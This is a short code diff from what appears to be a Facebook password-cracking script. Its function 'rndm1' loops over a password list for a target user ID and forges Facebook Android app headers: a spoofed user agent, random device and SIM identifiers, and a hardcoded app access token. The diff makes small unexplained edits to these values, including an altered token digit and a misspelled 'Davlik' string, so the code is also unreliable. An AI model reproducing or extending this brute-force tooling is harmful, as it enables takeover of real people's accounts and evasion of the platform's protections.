@@ -466,7 +466,7 @@ def rndm1(uid,passlist):
                 for pas in passlist:
                         accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                         fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
-                        fbbv = str(random.randint(111111111,999999999))
+                        fbbv = str(random.randint(111111111,999999998))
                         android_version = device['android_version']
                         model = device['model']
                         build = device['build']
@@ -482,13 +482,13 @@ def rndm1(uid,passlist):
                         fbrv = '0'
                         fban = 'FB4A'
                         fbpn = 'com.facebook.katana'
-                        ua = 'Davik/2.1.0 (Linux; U; Android '+android_version+'.0.1; '+model+' Build/'+build+') [FBAN/'+fban+';FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/{density=2.625,width=1080,height=1920};FBLC/'+fblc+';FBRV/'+str(random.randint(000000000,999999999))+';FBCR/'+fbcr+';FBMF/'+fbmf+';FBBD/'+fbbd+';FBPN/'+fbpn+';FBDV/'+fbdv+';FBSV/'+fbsv+';FBOP/19;FBCA/'+fbca+';]'
+                        ua = 'Davlik/2.1.0 (Linux; U; Android '+android_version+'.0.1; '+model+' Build/'+build+') [FBAN/'+fban+';FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/{density=2.625,width=1080,height=1920};FBLC/'+fblc+';FBRV/'+str(random.randint(000000000,999999999))+';FBCR/'+fbcr+';FBMF/'+fbmf+';FBBD/'+fbbd+';FBPN/'+fbpn+';FBDV/'+fbdv+';FBSV/'+fbsv+';FBOP/19;FBCA/'+fbca+';]'
                         random_seed = random.Random()
                         adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                         device_id = str(uuid.uuid4())
                         secure = str(uuid.uuid4())
                         family = str(uuid.uuid4())
-                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
+                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a31'
                         xd =str(''.join(random_seed.choices(string.digits, k=20)))
                         sim_serials = f'["{xd}"]'
                         li = ['28','29','210']
